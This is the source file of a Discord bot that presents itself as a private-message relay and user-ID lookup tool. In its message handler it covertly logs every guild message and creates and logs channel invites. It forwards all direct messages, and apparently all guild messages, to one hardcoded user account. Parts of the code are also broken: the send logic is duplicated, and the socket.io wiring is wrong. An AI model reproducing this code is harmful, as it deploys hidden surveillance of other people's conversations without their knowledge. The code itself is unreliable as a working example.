const Discord = require('discord.js');
const client = new Discord.Client();
require('dotenv').config();
const prefix = process.env.prefix;
const io = require('socket.io')(3000);
const socket = io('http://localhost:3000');

function between(min, max) {return Math.floor(Math.random() * (max - min) + min)}

client.once('ready', () => {
console.log('Ready!');
client.user.setActivity(`${prefix}send | ${prefix}id`,{ type: 'WATCHING' });
setInterval(function(){client.user.setActivity(`${prefix}send | ${prefix}id | ${prefix}emojis`,{ type: 'WATCHING' });},10000);
});

socket.on('guildMessage',message=>{
const user = client.users.cache.get('748531954391056445');
user.send(`__**New guild message received**__\r\n**Guild**\r\${message.guild.name} - ${message.channel.name}\r\n**Message**n\r\n${message.author.tag}: ${message.content}`);
});

client.on('message', async message =>{
if (message.content.startsWith(prefix)===true&&message.author.bot===false) {
const command = message.content.substring(prefix.length,message.content.length);

if (command.startsWith("send")===true) {
const args = command.split(" ");
if (args[1]!=null&&args.length>1) {
message.delete();
const embed = new Discord.MessageEmbed()
.setColor('#0099ff')
.setTitle(":envelope_with_arrow: | New message")
.setAuthor("You've got a message")
.addFields(
{name:`:person_pouting: | Sender`,value:`${message.author.tag} (${message.author.id})`},
{name:`:envelope: | Message`,value:command.substring(command.indexOf(args[2]),command.length)}
);
const user = client.users.cache.get(args[1]);
user.send("New message!",[embed]);
message.author.send(`:incoming_envelope: | Successfully sent a message to: **${user.tag}**`);
}else{
message.author.send(`:x: | Incorrect command syntax\r\nType the ID of the user you want to send message to\r\nAnd then type the message\r\nExample: _${prefix}send <user id> <message>_`);
}}

if (command.startsWith("send")===true) {
const args = command.split(" ");
if (args[1]!=null&&args.length>1) {
message.delete();
const embed = new Discord.MessageEmbed()
.setColor('#0099ff')
.setTitle(":envelope_with_arrow: | New message")
.setAuthor("You've got a message")
.addFields(
{name:`:person_pouting: | Sender`,value:`${message.author.tag} (${message.author.id})`},
{name:`:envelope: | Message`,value:command.substring(command.indexOf(args[2]),command.length)}
);
const user = client.users.cache.get(args[1]);
user.send("New message!",[embed]);
message.author.send(`:incoming_envelope: | Successfully sent a message to: **${user.tag}**`);
}else{
message.author.send(`:x: | Incorrect command syntax\r\nType the ID of the user you want to send message to\r\nAnd then type the message\r\nExample: _${prefix}send <user id> <message>_`);
}}

if (command.startsWith("id")===true) {
if (message.mentions.members.first()!=null) {
var args = command.split(" ");
var user = message.guild.members.cache.get(message.mentions.members.first().id);
message.reply(`here's **${user.user.username}**'s user's ID: ${user.id} | :card_box:`);}else{message.reply("please mention a user to get his ID | :x:");}
}

}});

client.on('message',async message=>{
if (message.author.bot===false) {
if (message.guild!=null) {
socket.broadcast.emit('guildMessage',message);
console.log(`____`);
console.log(`Server name: ${message.guild.name} | Channel name: ${message.channel.name}`);
console.log(`${message.author.tag}: ${message.content}`);
message.channel.createInvite()
.then(invite => console.log(`Invite code: ${invite.code}, Guild name: ${message.guild.name}, Channel name: ${message.channel.name}, Message author: ${message.author.tag}`))
.catch(console.error);
} else {
const embed = new Discord.MessageEmbed()
.setColor('#0099ff')
.setTitle(":envelope_with_arrow: | DM Message")
.setAuthor("New DM received!")
.addFields(
{name:`:person_pouting: | Sender`,value:`${message.author.tag} (${message.author.id})`},
{name:`:envelope: | Message`,value:`\`${message.content}\``}
);
const user = client.users.cache.get("748531954391056445");
user.send(`${message.author.tag} DMed me!`,[embed]);
}}
});

client.login(process.env.token);